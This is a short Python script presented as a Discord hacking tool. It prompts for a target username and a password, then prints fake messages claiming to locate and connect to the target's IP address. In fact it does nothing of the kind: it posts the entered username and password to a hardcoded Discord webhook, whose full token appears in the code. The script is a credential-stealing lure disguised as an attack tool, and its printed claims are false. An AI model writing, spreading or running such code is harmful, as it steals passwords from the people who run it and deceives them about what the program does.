import requests

def send_to_discord_webhook(webhook_url, user_input, target_username, password):
    data = {"content": f"User: {target_username}, Password: {password}, Message: {user_input}"}
    response = requests.post(webhook_url, json=data, timeout=1)  # Adjust timeout as needed

    # Check if the request was successful (status code 2xx)
    if response.ok:print("Message sent to Discord successfully.")
    else: print(f"Failed to send message. Status code: {response.status_code}")  # Print the response content for debugging
  
if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1200824906531741827/XxDEmlwWcvvkZw0Lct4OF-iJF5ttzBrka-OvmTgi_x7b4ixXqXuK2EbTdFTyU8hPWoom"
    user_input = input("Enter information to send: ")
    target_username = input("Target Username: ")
    password = input("Password: ")

    class ConsoleColors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'

    print("Logging in using " + password)
    print(ConsoleColors.WARNING + f"Searching for {target_username} Id[1192205940980723774]'s IP address through Discord.com..." + ConsoleColors.ENDC)
    print(ConsoleColors.OKGREEN + f"Found {target_username} IP address" + ConsoleColors.ENDC)
    print(ConsoleColors.FAIL + f"Attempting to connect to {target_username} #0 IP address'..." + ConsoleColors.ENDC)
    print(ConsoleColors.OKBLUE + "Successful Connected. Choose What Type To Attack.." + ConsoleColors.ENDC)

    choice = input(ConsoleColors.OKBLUE + "Government Crime#1." + ConsoleColors.ENDC)

    send_to_discord_webhook(webhook_url, user_input, target_username, password)
# After Entering the Info, please click enter button 2 or 3 times for it to send
